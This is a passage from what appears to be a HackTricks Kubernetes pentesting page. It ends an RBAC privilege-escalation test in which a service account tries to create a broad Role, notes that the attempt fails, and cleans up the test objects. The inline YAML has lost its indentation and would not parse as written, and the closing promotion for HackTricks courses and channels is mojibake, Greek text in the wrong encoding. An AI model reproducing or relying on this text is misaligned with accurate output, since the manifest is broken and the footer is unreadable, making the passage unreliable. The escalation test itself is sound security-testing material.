' | kubectl apply -f -

# Try to create a role over all the resources  with "create" and "patch"
# This won't wotrk
echo 'kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
name: test-r2
rules:
- apiGroups: [""]
resources: ["*"]
verbs: ["patch", "create"]' | kubectl --as system:serviceaccount:default:test-sa apply -f-

# Clean the environment
kubectl delete rolebinding test-rb
kubectl delete role test-r
kubectl delete role test-r2
kubectl delete serviceaccount test-sa
```
{% hint style="success" %}
ÎœÎ¬Î¸Îµ & ÎµÎ¾Î¬ÏƒÎºÎ·ÏƒÎµ ÏƒÏ„Î¿ Hacking Ï„Î¿Ï… AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Î•ÎºÏ€Î±Î¯Î´ÎµÏ…ÏƒÎ· HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸Îµ & ÎµÎ¾Î¬ÏƒÎºÎ·ÏƒÎµ ÏƒÏ„Î¿ Hacking Ï„Î¿Ï… GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Î•ÎºÏ€Î±Î¯Î´ÎµÏ…ÏƒÎ· HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î£Ï…Î¼Î¼ÎµÏ„Î­Ï‡ÎµÏ„Îµ** ğŸ’¬ [**ÏƒÏ„Î·Î½ Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎšÎ¿Î¹Î½Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Ï‡Î¬ÎºÎ¹Î½Î³Îº Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs** ÏƒÏ„Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
